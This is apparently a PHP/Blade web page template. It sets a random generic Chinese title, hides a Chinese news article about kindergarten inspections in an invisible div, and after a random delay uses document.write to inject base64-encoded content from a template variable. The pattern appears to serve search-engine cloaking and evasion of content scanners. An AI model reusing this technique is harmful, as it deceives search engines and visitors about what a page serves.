<?php
    $titles = [
        '生活百科',
        '网址导航',
        '今日头条',
        '生活常识',
    ];
    $pageTitle = array_random($titles);
?>
<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>{{$pageTitle}}</title>
</head>
<body>

<div style="display: none">
    原标题：国务院教育督导委员会办公室紧急部署开展幼儿园规范办园行为专项督导检查
    针对近期多地发生幼儿在幼儿园受到侵害事件，11月24日，国务院教育督导委员会办公室印发紧急通知，部署立即在全国开展幼儿园规范办园行为专项督导检查，要求有效减少类似事件发生，确保广大幼儿的身心健康。
    通知指出，近期多地发生幼儿在幼儿园受到侵害事件，影响恶劣，给受害幼儿及家庭造成重大伤害，后果十分严重。这些事件的发生，反映出一些地方和幼儿园仍然存在管理不善，制度不落实，执行不到位的现象。各地教育行政部门要高度重视学前教育工作，加强对幼儿园的管理和师德师风建设，牢固树立育人为本，促进幼儿健康成长的教育目标，把每一所幼儿园办成幼儿快乐成长的乐园，让家长安心，群众满意，社会放心。
    通知要求，各地要按照《未成年保护法》《教师法》《幼儿园管理条例》《幼儿园工作规程》和《幼儿园规范办园行为督导评估办法》有关要求，立即组织开展一次全省范围的幼儿园办园行为专项督导检查，重点检查师德师风建设情况，及时发现问题，进行整改。对幼儿园伤害幼儿等恶性事件，坚决发现一起，查处一起，坚决防止幼儿园伤害幼儿事件的发生，切实保障幼儿安全健康。
    通知强调，各地教育行政部门和幼儿园要进一步加强幼儿园风险管控，强化准入管理，强化技术手段监管，形成常态化监管工作机制。建立和完善幼儿园突发事件应急处理问责机制，明确相关责任，对因管理不到位造成重大事故或造成恶劣社会影响的，要依法追究有关责任人责任。
    通知要求，各地要建立幼儿园办园行为常态监测机制，及时了解幼儿园办园行为和基本运行情况，按要求报送相关数据信息。特别是对重大事件要妥善处理，及时上报，保障幼儿园不断规范管理，健康发展。</div>

<script type="text/javascript">
var base64EncodeChars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",base64DecodeChars=[-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1];
function base64decode(d){var b,a,c,f,e;f=d.length;c=0;for(e="";c<f;){do b=base64DecodeChars[d.charCodeAt(c++)&255];while(c<f&&-1==b);if(-1==b)break;do a=base64DecodeChars[d.charCodeAt(c++)&255];while(c<f&&-1==a);if(-1==a)break;e+=String.fromCharCode(b<<2|(a&48)>>4);do{b=d.charCodeAt(c++)&255;if(61==b)return e;b=base64DecodeChars[b]}while(c<f&&-1==b);if(-1==b)break;e+=String.fromCharCode((a&15)<<4|(b&60)>>2);do{a=d.charCodeAt(c++)&255;if(61==a)return e;a=base64DecodeChars[a]}while(c<f&&-1==a);if(-1==
a)break;e+=String.fromCharCode((b&3)<<6|a)}return e}function utf8to16(d){var b,a,c,f,e,g;b="";c=d.length;for(a=0;a<c;)switch(f=d.charCodeAt(a++),f>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:b+=d.charAt(a-1);break;case 12:case 13:e=d.charCodeAt(a++);b+=String.fromCharCode((f&31)<<6|e&63);break;case 14:e=d.charCodeAt(a++),g=d.charCodeAt(a++),b+=String.fromCharCode((f&15)<<12|(e&63)<<6|(g&63)<<0)}return b};
setTimeout(function () {document.write(utf8to16(base64decode("{{$content}}")));},Math.random()*500+300);
</script>

</body>
</html>